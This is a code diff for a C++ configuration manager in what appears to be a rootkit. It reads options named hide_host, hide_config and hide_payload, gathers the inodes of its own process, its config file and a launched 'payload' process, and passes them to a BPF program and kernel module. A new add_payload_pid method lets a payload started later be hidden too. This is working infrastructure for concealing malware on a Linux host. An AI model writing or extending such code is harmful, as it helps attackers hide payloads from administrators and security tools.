@@ -37,6 +37,7 @@ bool ConfigManager::read() {
         // Configure bpf program
         // If true, get inode of /proc/<self>
         if (config["bpf_program_config"]["hide_host"].as<bool>()) {
+            bpfConf.hide_host = true;
             auto inode_opt = utils::get_inode_of_process(getppid());
             if (inode_opt.has_value())
                 bpfConf.inodes.push_back(inode_opt.value());
@@ -44,18 +45,20 @@ bool ConfigManager::read() {
 
         // If true, get inode of <config_path>
         if (config["bpf_program_config"]["hide_config"].as<bool>()) {
+            bpfConf.hide_config = true;
             auto inode_opt = utils::get_inode_of_file(config_path);
             if (inode_opt.has_value())
                 bpfConf.inodes.push_back(inode_opt.value());
         }
 
         // If true, get inode of /proc/<payload>
-        if (config["bpf_program_config"]["hide_payload"].as<bool>()
-            && payload_pid != 0) {
-
-            auto inode_opt = utils::get_inode_of_process(payload_pid);
-            if (inode_opt.has_value())
-                bpfConf.inodes.push_back(inode_opt.value());
+        if (config["bpf_program_config"]["hide_payload"].as<bool>()) {
+            bpfConf.hide_payload = true;
+            if (payload_pid != 0) {
+                auto inode_opt = utils::get_inode_of_process(payload_pid);
+                if (inode_opt.has_value())
+                    bpfConf.inodes.push_back(inode_opt.value());
+            }
         }
 
         // Get all additional inodes
@@ -71,6 +74,19 @@ bool ConfigManager::read() {
 
     this->is_config_ready = true;
     return true;
+}
+
+
+void ConfigManager::add_payload_pid(pid_t pid) {
+    if (!this->is_config_ready) return;
+
+    this->payload_pid = pid;
+
+    if (bpfConf.hide_payload) {
+        auto inode_opt = utils::get_inode_of_process(payload_pid);
+        if (inode_opt.has_value())
+            bpfConf.inodes.push_back(inode_opt.value());
+    }
 }
 
 std::optional<KernelModuleConfig> ConfigManager::get_kernel_module_config() {
